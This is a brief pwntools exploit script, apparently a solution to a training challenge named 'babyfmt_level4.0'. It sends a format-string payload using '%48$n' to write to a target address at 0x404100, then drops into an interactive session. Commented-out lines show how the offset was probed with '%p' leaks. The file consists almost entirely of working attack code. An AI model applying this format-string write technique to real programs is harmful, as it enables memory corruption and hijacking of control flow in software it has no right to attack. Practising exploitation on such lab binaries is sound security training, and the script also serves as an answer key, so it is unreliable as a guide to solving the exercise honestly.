from pwn import *

context.gdb_binary = "/lib/pwndbg-gdb/bin/pwndbg"
io = process("./babyfmt_level4.0")

win_Addr = 0x404100

io.recvuntil(b"data!")


# 写入填充后要重新计算偏移量
payload = b"a" * 148 + b"%48$nBB" + p64(win_Addr)
#payload = p64(win_Addr) + b"%29$p"
#payload = b'BBBAAAAAAAA' + b" %p" * 30
#offset = 29
#gdb.attach(io)
io.sendline(payload)
io.interactive()
